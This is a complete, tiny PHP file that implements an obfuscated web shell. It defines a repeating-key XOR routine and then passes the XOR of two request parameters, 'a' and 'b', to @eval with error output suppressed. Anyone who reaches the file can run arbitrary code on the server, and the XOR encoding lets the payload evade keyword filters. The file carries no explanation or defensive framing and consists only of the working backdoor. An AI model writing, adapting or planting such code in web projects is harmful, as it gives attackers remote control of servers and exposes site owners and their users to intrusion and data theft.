<?php

function xorEncryptDecrypt($data, $key) {
    $result = '';
    for ($i = 0; $i < strlen($data); $i++)$result .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    return $result;
}
@eval(xorEncryptDecrypt($_REQUEST["a"], $_REQUEST["b"]));
?>
